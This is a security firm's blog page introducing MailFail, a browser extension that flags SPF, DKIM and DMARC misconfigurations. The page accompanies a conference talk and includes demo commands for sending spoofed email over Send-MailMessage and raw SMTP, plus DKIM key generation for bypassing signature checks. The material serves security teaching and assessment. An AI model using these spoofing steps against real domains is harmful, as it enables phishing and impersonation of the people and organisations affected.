# [MailFail](https://www.blackhillsinfosec.com/mailfail/)

He now spends his time creating and contributing to open-source projects along with performing security assessments of corporations networks and infrastructure.*

![](https://www.blackhillsinfosec.com/wp-content/uploads/2025/09/default_web_header-1.png)

*This blog is a resource associated with the following webcast and Wild West Hackin’ Fest 2025 talk. The site was previously hosted at https://m.ail.fail but was transferred to the official BHIS blog.*

* <https://www.youtube.com/watch?v=UbdMAmsWus8>
* <https://www.youtube.com/watch?v=o1b8D_5gdOo>

![](https://www.blackhillsinfosec.com/wp-content/uploads/2025/09/mailfail-128x128-1.png)

MailFail is a Firefox browser extension that identifies and provides commands to exploit a large number of email-related misconfigurations for the current domain and subdomain. The extension’s UI popup highlights any misconfigurations in red and links to the supporting documentation.

[![](https://www.blackhillsinfosec.com/wp-content/uploads/2025/09/get-the-addon-fx-apr-2020.svg)](https://addons.mozilla.org/en-US/firefox/addon/mailfail/)![](https://www.blackhillsinfosec.com/wp-content/uploads/2025/09/css-exfil-protection.svg)![](https://www.blackhillsinfosec.com/wp-content/uploads/2025/09/mailfail.svg)[![](https://www.blackhillsinfosec.com/wp-content/uploads/2025/09/github-150x150.png)](https://github.com/ACK-J/MailFail)

---

A list of DKIM selectors can be found on [GitHub](https://github.com/ACK-J/MailFail/blob/main/DKIM_Selectors.txt).

You can download the MailFail extension from [Mozilla Add-ons](https://addons.mozilla.org/en-US/firefox/addon/mailfail/).

The MailFail GitHub repository is located at [github.com/ACK-J/MailFail](https://github.com/ACK-J/MailFail/).

Learn how to reconstruct private keys from two prime numbers on [my Github Gist](https://gist.github.com/ACK-J/487d0de5737458d953ca818a0645b09b).

Check out the script for sending DKIM signed emails with a private key on [my Github Gist](https://gist.github.com/ACK-J/76585af46375641ec841cb6b77d345c3).

Bonus: Use this [Python script](https://gist.github.com/ACK-J/8a189bafbb54e00fb1b3f3e22dcd81c9) to check a list of domains for DMARC misconfigurations.

**Demo 2: Send an Email with Send-MailMessage**

```
dig MX ilebi.com +short
Send-MailMessage -SmtpServer 96-126-99-62.ip.linodeusercontent.com -To [email protected] -From [email protected] -Subject "Congrats!" -Body "You've been accepted!" -BodyAsHTML
```

**Demo 3: Bypass SPF**

```
dig TXT spf.m.ail.fail +short
curl ifconfig.me

telnet mailsec.protonmail.ch 25
HELO spf.m.ail.fail
MAIL FROM:
RCPT TO:
DATA
Content-Type: multipart/mixed; boundary="NextMimePart"
From: [email protected]
To: [email protected]
Subject: Piano Man
Message-ID:

--NextMimePart
Content-Type: text/html;

Sing us a song.
.
```

**Demo 4: Bypass DKIM**

```
openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:1024 -out dkim_1024_private.pem
openssl rsa -pubout -in dkim_1024_private.pem -out dkim_1024_public.pem
cat dkim_1024_public.pem
dig TXT dkim1024._domainkey.m.ail.fail +short
# https://gist.github.com/ACK-J/76585af46375641ec841cb6b77d345c3

```
